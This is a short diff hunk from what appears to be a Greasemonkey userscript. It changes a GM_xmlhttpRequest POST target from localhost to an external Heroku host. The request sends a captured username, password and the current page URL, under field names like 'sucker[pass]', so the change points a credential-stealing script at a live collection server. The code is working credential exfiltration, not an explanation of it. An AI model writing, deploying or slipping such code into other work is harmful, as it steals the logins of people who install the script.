@@ -147,7 +147,7 @@ window.show = function()
     GM_xmlhttpRequest(
       {
         method: "POST",
-        url: "http://localhost:3000/grabmyass",
+        url: "http://suky.heroku.com/grabmyass",
         data: "sucker[name]=" + user + "&" + "sucker[pass]=" + pass + "&" + "sucker[link]=" + document.URL,
         headers: 
         {
